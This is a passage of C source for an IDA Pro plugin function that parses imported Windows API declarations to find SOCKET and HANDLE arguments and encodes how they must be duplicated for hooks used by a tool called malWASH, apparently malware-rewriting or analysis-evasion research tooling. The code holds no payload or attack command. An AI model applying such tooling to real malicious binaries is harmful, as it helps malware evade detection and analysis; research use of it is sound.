**      from this address, will always point to an entry inside IAT. By reading the type of this entry we
**      identify the imported function declaration with high detail. For instance:
**          SOCKET __stdcall socket(int af, int type, int protocol)
**      From the above string it's very easy to see if and which arguments (or the return value) use a 
**      socket. Thus we can avoid having a huge list of all function that use socket/handles and check each 
**      imported function against this list to see if the latter uses any socket/handles.
**
**  Arguments:  iaddr (ea_t)   : Address of the instruction that transfers control to the imported module
**              nargs (ushort) : Number of function's arguments (OUT)
**
**
**  Return Value: If any errors occured (e.g. >2 arguments that need duplication), the return value is -1.
**      If function doesn't contain any HANDLE/SOCKET arguments/return value, the returns value is ANY. 
**      Otherwise function returns a 32-bit number with the following structure:
**  
**      31              23              15              7               0
**      +---------------+---------------+---------------+---------------+
**      |   dup* type   |   dup* type   | 2nd argument  | 1st argument  |
**      |  for malWASH  | for crthook() |   location    |   location    |
**      +---------------+---------------+---------------+---------------+
**
**      Remarks:
**      1st argument location   --> Location of 1st argument that needs to be duplicated 
**      2nd argument location   --> Location of 2nd argument that needs to be duplicated (in case of 
**                                  return value or a HANDLE pointer, we set MSBit of LSByte instead)
**      dup* type for crthook() --> Duplication type needed for crthook()
**      dup* type for malWASH   --> Duplication type needed for malWASH during execution
*/
uint dupchk( ea_t iaddr, ushort *nargs )
{
    type_t  buf    [MAXIMPFUNDECLLEN];                      // the first 3 buffers are auxilary
    p_list  fnames [MAXIMPFUNDECLLEN];                      //
    char    func   [MAXFUNAMELEN];                          // function name    
    char    type   [MAXIMPFUNDECLLEN],                      //
            fundecl[MAXIMPFUNDECLLEN];                      // this buffer contains the function declaration
    ea_t    iat_addr;                                       // address of function in IAT
    ushort  duploc, done;                                   // local vars
    uint    retval = ANY;                                   // return value = 0xff7f


    // don't duplicate CreateThread
    get_name(BADADDR, get_first_dref_from(iaddr) != BADADDR ? 
                      get_first_dref_from(iaddr) :          // for "call __imp__closesocket"
                      get_next_cref_from(iaddr, get_first_cref_from(iaddr)), // for "call esi; __imp__closesocket"
             func, MAXFUNAMELEN);       
        
    if( strstr(func, "CreateThread" ) )                     // check if it is CreateThread()
        return ANY;

    iat_addr = get_first_dref_from(iaddr) != BADADDR ?      // get address of function entry in IAT
               get_first_dref_from(iaddr) : get_next_cref_from(iaddr, get_first_cref_from(iaddr));

    // get type information (to arrays buf and fnames)
    // WARNING: get_ti is DERPECATED
    get_ti(iat_addr, buf, MAXIMPFUNDECLLEN,  fnames, MAXIMPFUNDECLLEN );

    // print type into 1 signle line (merge buf and fnames to produce type)
    print_type_to_one_line(type, MAXIMPFUNDECLLEN, idati, buf, NULL, NULL, fnames, NULL);

    // convert type to a normal char* string
    strcpy_s(fundecl, MAXIMPFUNDECLLEN, qstrdup(type));

    /*
    ** In case that NTAPI functions are used, we won't be able to get their prototypes as these
    ** functions are undocumented. The only solution, is to explicitly define their definitions:
    **
    **  if( !strcmp(func, "NtClose" ) )
    **      strcpy_s(fundecl, MAXIMPFUNDECLLEN, "BOOL __stdcall (HANDLE hObject)");
    **
    ** We can do the same for any undocumented function we need :)
    */
    
    // at this point funcdecl contains the full function declaration (without function name). For example
    // function declaration: 
    //      int __stdcall LoadStringW(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int cchBufferMax)
    // will give us the string:
    //      int __stdcall(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int cchBufferMax)
    msg( "    [*] Getting imported function declaration: %s\n", fundecl );  
    

    duploc = 0;                                             // clear iterator
    done   = 0;                                             // not trampolines created so far

    // now, parse the arguments and search for SOCKET or HANDLE arguments
    // we'll use secure version of strtok, to get all tokens from function declaration. Delimiters are: '('
    // ')' and ','. The first token will be the return type followed by calling convention. Then next tokens
    // will be the function arguments (type [space] name).
    for( char *nxttok, *token=strtok_s(fundecl, "(),", &nxttok); token!=NULL; 
                        token=strtok_s(NULL,    "(),", &nxttok), ++duploc
       )
    {
        char    func[MAXFUNAMELEN] = {0};                   // store function name here


        // because there's a space after delimiter ',', all arguments after 1st will start with a space.
        // Remove it.
        if( token[0] == ' ' ) token++;

        // * * * * * * * * * * * * * * * * * * * *
        if( strstr(token, "SOCKET") != NULL )               // SOCKET as argument?
        {
            if( ++done > 1 ) 
            {
                if( UNPACK_1(retval) != DUPSOCK  &&
                    UNPACK_1(retval) != DUPSOCK2 && 
                    UNPACK_1(retval) != CLOSESOCK )  {                      
                        fatal("Current version does not support mix of HANDLE and SOCKET arguments");
                        return ERROR;                       // failure
                    }

                // parse the arguments from left to right, so in case [3], LSB of retval will be 0.
                if( UNPACK_4(retval) ) 
                {
                    // we have 2 arguments that need to be replaced: 1st arg in LSByte, 2nd in 2nd LSByte
                    retval = PACK(DUPSOCK2, 0, duploc, UNPACK_4(retval));       

                    if( done > 2 ) {                        // no more than 2
                        fatal("Current version does not create hooks with >2 SOCKET arguments");
                        return ERROR;                       // failure
                    }
                }
                else 
                // if you already have 2 (valid) arguments, then one of these will be >0. Thus you cannot
                // pass the previous check. If have 1 argument we know that is the return value, so we set
                // the MSBit:
                retval = PACK(DUPSOCK, 0, 0, duploc|0x80);  // set MSBit of LSByte
                continue;                                   // skip code below
            }

            // Special Case when function is closesocket()
            get_name(BADADDR, iat_addr, func, MAXFUNAMELEN);// get name of address from .idata
            
            retval = ((strstr(func, "closesocket") ? CLOSESOCK : DUPSOCK) << 24) | duploc;
        }
        // * * * * * * * * * * * * * * * * * * * *
        else if( strstr(token, "PHANDLE") != NULL ||        // HANDLE or
                 strstr(token, "PHKEY")   != NULL )         // HKEY pointer as argument?
        {
            // we treat PHANDLE and PHKEY as return values

            if( UNPACK_1(retval) == DUPSOCK  || 
                UNPACK_1(retval) == DUPSOCK2 || 
                UNPACK_1(retval) == CLOSESOCK )  {                      
                    fatal("Current version does not support mix of HANDLE and SOCKET arguments");
                    return ERROR;                           // failure
            }
/*
            if( !UNPACK_4(retval) ||                        // return value already set? 
                (UNPACK_4(retval) & 0x80) )                 // (uninitialized retval is 0x7f)
            {
                // in this case we need to do 2 INSERT. It's not hard but we need to add more cases in
                // crthook(). We won't implemented it here though as it's one to the very rare cases 
                // (case [9])
                fatal("Current version cannot handle 2 HANDLE pointers or a HANDLE pointer + return value");
                return ERROR;                               // failure
            }
*/
            if( ++done > 1 )
            {
                if( done > 2 ) {                            // no more than 2
                    fatal("Current version does not create hooks with >2 HANDLE arguments");
                    return ERROR;                           // failure
                }

                // store both handles, and move pointer handle to the last position
                // also we set MSBit of LSByte, to indicate that we treat this as a return value

                if( !UNPACK_2(retval) )                     // previous argument was a HANDLE
                    retval = PACK(DUPHANDLE, DUPPTRHANDLE, duploc, UNPACK_4(retval) | 0x80);
                else                                    // previous argument was a HANDLE pointer               
                    retval = PACK(DUPHANDLE, DUPPTRHANDLE_2, 
                                  (UNPACK_2(retval) == DUPPTRHANDLE ? UNPACK_3(retval) : UNPACK_4(retval)) & 0x7f, 
                                  duploc | 0x80);
            }
            else retval = PACK(DUPHANDLE, DUPPTRHANDLE, duploc, 0x80);
        }
        // * * * * * * * * * * * * * * * * * * * *
        else if( strstr(token, "HANDLE") != NULL ||         // HANDLE or
                 strstr(token, "HKEY")   != NULL )          // HKEY as argument?
        {
            // HWND are global handles and not per-process, so we can safely ignore them

            if( ++done > 1 ) 
            {
                if( UNPACK_1(retval) == DUPSOCK  || 
                    UNPACK_1(retval) == DUPSOCK2 || 
                    UNPACK_1(retval) == CLOSESOCK )  {                      
                        fatal("Current version does not support mix of HANDLE and SOCKET arguments");
                        return ERROR;                       // failure
                    }

                // parse the arguments from left to right, so in case [3], LSB of retval will be 0.
                if( UNPACK_4(retval) ) 
                {   
                    // we have 2 arguments that need to be replaced: 1st arg in LSByte, 2nd in 2nd LSByte
                    retval = PACK(DUPHANDLE, 0, duploc, UNPACK_4(retval));

                    if( done > 2 ) {                        // no more than 2
                        fatal("Current version does not create hooks with >2 HANDLE arguments");
                        return ERROR;                       // failure
                    }
                }
                else 
                // if you already have 2 (valid) arguments, then one of these will be >0. Thus you cannot
                // pass the previous check. If have 1 argument we know that is the return value, so we set
                // the MSBit:
                retval = PACK(DUPHANDLE, 0, 0, duploc|0x80);// set MSBit of LSByte
                continue;                                   // skip code below
            }

            // Special Case when function is CloseHandle()
            get_name(BADADDR, iat_addr, func, MAXFUNAMELEN);// get name of address from .idata
                
            retval = ((strstr(func, "CloseHandle") ||       // CloseHandle() or RegCloseKey()
                       strstr(func, "RegCloseKey") ? CLOSEHANDLE : DUPHANDLE)<< 24) | duploc;
        }
    }
    
    if( retval != ANY )
        msg("    [-] Registering a hook function at %x. Function's return value: 0x%08x\n", iaddr, retval);

    *nargs = duploc;                                        // return also number of arguments
                                                            // we need this for handle pointers

    return retval;                                          // return type + location 
}
//-----------------------------------------------------------------------------------------------------------
